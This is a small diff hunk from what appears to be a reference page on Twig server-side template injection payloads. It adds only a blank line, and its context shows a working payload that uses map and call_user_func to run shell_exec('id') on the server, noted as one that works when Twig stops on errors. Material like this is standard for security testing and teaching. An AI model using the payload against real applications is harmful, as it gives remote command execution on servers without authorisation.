@@ -167,6 +167,7 @@ $output = $twig > render (
 ```
 
 With certain settings, Twig interrupts rendering, if any errors or warnings are raised. This payload works fine in these cases:
+
 ```php
 {{ {'id':'shell_exec'}|map('call_user_func')|join }}
 ```
